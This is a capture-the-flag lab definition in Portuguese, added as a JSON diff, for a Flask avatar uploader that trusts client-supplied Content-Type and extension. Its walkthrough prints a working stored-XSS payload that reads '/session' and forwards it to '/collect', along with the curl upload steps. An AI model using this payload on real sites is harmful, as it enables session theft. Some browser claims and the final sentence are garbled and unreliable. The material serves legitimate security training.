@@ -1,0 +1,83 @@
+{
+  "slug": "upload-content-type-confusion",
+  "title": "Bucket de avatares do OrbitProfile",
+  "codename": "ORBITPROFILE",
+  "summary": "Um uploader de perfil social valida um avatar confiando no Content-Type informado pelo cliente e na extensão do arquivo. O markup armazenado é depois servido inline a partir da mesma origem, e o endpoint de sessão entrega a flag para qualquer script da mesma origem.",
+  "category": "upload",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "upload-content-type-confusion",
+  "estimated_minutes": 25,
+  "xp": 160,
+  "tech": [
+    "Flask",
+    "multipart upload",
+    "Content-Type handling",
+    "Media serving"
+  ],
+  "tags": [
+    "upload",
+    "content-type",
+    "mime-sniffing",
+    "stored-xss",
+    "svg"
+  ],
+  "story": "O OrbitProfile permite que membros publiquem um perfil público com avatar. Os avatares são enviados para um bucket de mídia e servidos de volta pela mesma origem Flask que hospeda a API de sessão. O validador foi escrito às pressas durante uma hack week: ele aceita um arquivo quando o navegador declara um Content-Type de imagem ou quando o nome do arquivo termina em uma extensão de imagem, depois armazena e serve de volta usando esse nome. O bucket também mantém algumas flags de compatibilidade ligadas para que dashboards antigos possam fazer inline de CSS e pré-visualizações SVG. Qualquer pessoa que abra um arquivo armazenado executa seu conteúdo na origem do OrbitProfile,sonde `/session` retorna o registro do membro autenticado.",
+  "objective": "Envie um arquivo que passe na validação de avatar mas contenha HTML e JavaScript, encontresonde ele é servido e prove que a página consegue ler o valor da sessão da vítima em `/session`.",
+  "rules": "Fique na origem loopback atribuída. O bucket de mídia e a API de sessão fazem parte do mesmo engajamento. Não faça scan de outras portas nem requisições externas. As flags são dinâmicas e podem ser verificadas por estado.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag de XSS no bucket de mídia",
+      "flag_type": "user",
+      "points": 160,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Duas checagens fracas",
+      "body": "O handler de upload aceita um arquivo quando OU o `Content-Type` multipart é de imagem OU o nome do arquivo termina em `.png`, `.jpg`, `.gif` ou `.svg`. Ele nunca inspeciona os bytes. Basta que um dos dois pareça imagem.",
+      "cost": 15
+    },
+    {
+      "level": 2,
+      "title": "Observe o que o bucket retorna",
+      "body": "Após o upload, a response linka o arquivo armazenado em `/media/<name>`. Requisite-o e leia o header `Content-Type`: markup enviado como `image/svg+xml` é armazenado com nome de stylesheet e servido de volta como `text/html`.",
+      "cost": 20
+    },
+    {
+      "level": 3,
+      "title": "Alcance o endpoint de sessão",
+      "body": "`/session` retorna JSON contendo o registro do membro e recusa requisições cujo `Sec-Fetch-Site` indique `cross-site`. Script rodando a partir do bucket é same-origin, então um `fetch('/session')` seguido de uma requisição para `/collect?c=...` prova que a página armazenada consegue ler o valor.",
+      "cost": 25
+    }
+  ],
+  "solution": {
+    "walkthrough": "O uploader de avatar é `POST /` com um campo multipart chamado `avatar`. A validação é:\n\n```python\ncontent_type = upload.mimetype.lower()\nsuffix = Path(upload.filename).suffix.lower()\nif content_type not in {\"image/png\",\"image/jpeg\",\"image/gif\",\"image/svg+xml\"} and suffix not in {\".png\",\".jpg\",\".jpeg\",\".gif\",\".svg\"}:\n    reject()\n```\n\nRotular o arquivo como SVG passa na primeira metade da checagem independentemente do conteúdo. O handler armazena os bytes sob um nome aleatório; se o payload começar com `<`, ele mantém um nome `.css` para que o bucket o sirva com `Content-Type: text/html` em todos os navegadores (navegadores ignoram o tipo declarado em requisições de stylesheet, então até um cliente estrito com nosniff o carrega como CSS).\n\n```bash\ncat > poc.svg <<'EOF'\n<html><body><script>\nfetch('/session').then(r=>r.text()).then(t=>fetch('/collect?c='+encodeURIComponent(t)));\n</script></body></html>\nEOF\ncurl -s -F 'avatar=@poc.svg;type=image/svg+xml' http://127.0.0.1:PORT/\n# response: Avatar stored as /media/<hex>.css\ncurl -s -D- http://127.0.0.1:PORT/media/<hex>.css\n```\n\nO arquivo armazenado é retornado com `Content-Type: text/html; charset=utf-8` e `X-Content-Type-Options: sniff-off-disabled`, então uma vítima que o abra executa o script na origem do OrbitProfile. O script chama `/session` (same-origin, portanto permitido) e encaminha o JSON para `/collect`, que registra o objetivo quando a flag aparece. A flag é verificada com:\n\n```bash\ncurl -s http://127.0.0.1:PORT/session   # {\"user\":\"mvance\",...,\"flag\":\"RV{...}\"}\n```\n\nVariações que ainda funcionam: enviar `poc.png` como `image/png`,.",
+    "root_cause": "O validador de upload confia em metadados controlados pelo atacante (o Content-Type multipart e a extensão do nome do arquivo) em vez do conteúdo do arquivo, e armazena o arquivo em um diretório que é servido de volta a partir da origem da aplicação com um tipo derivado desses mesmos metadados. A rota de mídia também substitui tipos de imagem e texto por `text/html` e desativa a proteção contra sniffing, então o markup armazenado executa como uma página com acesso total à API de sessão.",
+    "mitigation": "Decodifique o arquivo com uma biblioteca de imagens (Pillow ou libvips) e recodifique-o no servidor; o artefato armazenado deve ser uma imagem raster sanitizada, nunca os bytes enviados. Exija tanto o Content-Type quanto a extensão E magic bytes consistentes. Sirva mídia do usuário a partir de uma origem dedicada ou um host CDN que nunca compartilhe cookies com a aplicação, force o `Content-Type` a partir do formato decodificado, envie `X-Content-Type-Options: nosniff` e `Content-Disposition: attachment`, e adicione `Content-Security-Policy: sandbox` para conteúdo de usuário. Proteja endpoints de sessão JSON com `Sec-Fetch-Site`/tokens CSRF e mantenha valores sensíveis fora de responses que qualquer página da mesma origem consiga buscar."
+  },
+  "references": [
+    {
+      "title": "OWASP WSTG — Test Upload of Unexpected File Types (WSTG-BUSL-08)",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types",
+      "source_type": "standard",
+      "description": "Por que checagens de Content-Type/extensão são insuficientes e como testá-las."
+    },
+    {
+      "title": "MDN — X-Content-Type-Options (MIME sniffing)",
+      "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Content-Type-Options",
+      "source_type": "official",
+      "description": "Como o sniffing transforma uploads com tipo errado em documentos executáveis."
+    },
+    {
+      "title": "PortSwigger — File upload vulnerabilities",
+      "url": "https://portswigger.net/web-security/file-upload",
+      "source_type": "official",
+      "description": "Bypass de Content-Type, bypass de filtros de extensão e cadeias de upload para XSS."
+    }
+  ]
+}
